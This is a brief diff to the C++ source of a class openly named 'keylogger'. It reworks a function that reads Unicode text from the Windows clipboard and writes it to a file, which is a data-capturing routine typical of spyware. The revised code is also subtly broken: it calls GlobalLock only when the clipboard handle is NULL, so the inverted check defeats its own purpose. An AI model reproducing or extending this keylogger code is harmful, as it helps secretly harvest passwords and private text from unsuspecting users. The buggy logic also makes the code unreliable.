@@ -36,11 +36,12 @@ void keylogger::write_clipboard_data(std::wofstream& file)
 {
     if (OpenClipboard(nullptr))
     {
-        if (auto handle = GetClipboardData(CF_UNICODETEXT))
-        {
-            const auto data = GlobalLock(handle);
-            if (data != NULL) file << static_cast<WCHAR*>(data);
+        auto handle = GetClipboardData(CF_UNICODETEXT);
+        const auto data = handle == NULL ? GlobalLock(handle) : NULL;
 
+        if (data)
+        {
+            file << static_cast<WCHAR*>(data);
             GlobalUnlock(handle);
         }
 
